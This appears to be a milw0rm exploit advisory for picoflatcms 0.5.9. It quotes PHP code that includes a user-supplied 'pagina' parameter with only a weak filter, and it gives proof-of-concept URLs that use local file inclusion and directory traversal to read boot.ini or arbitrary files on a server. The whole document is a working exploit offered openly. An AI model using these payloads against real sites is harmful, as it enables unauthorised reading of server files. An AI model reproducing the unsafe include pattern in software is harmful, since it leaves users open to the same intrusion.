@@ -1,0 +1,31 @@
+---------------------------------------------------------------------------
+type attacak:Local File inclusion and that the possibility of a
+Directory traversal Windows disclosure boot.ini
+
+site name picoflatcms 0.5.9
+
+download http://picoflat.altervista.org/index.php?
+
+by gmda
+
+<!-- gmda@email.it -->
+
+
+---------------------------------------------------------------------------
+
+bug code
+
+<?php             if (eregi('://', $pagina) || eregi('\?', $pagina)) {
+                $pagina = "";
+                include "notfound.php";
+            }else{
+                include $pagina;             }
+        ?>
+
+p.o.c
+
+http://127.0.0.1/path/index.php?pagina=/./././././././boot.ini
+
+http://127.0.0.1/path/index.php?pagina=[file]
+
+# milw0rm.com [2008-05-29]
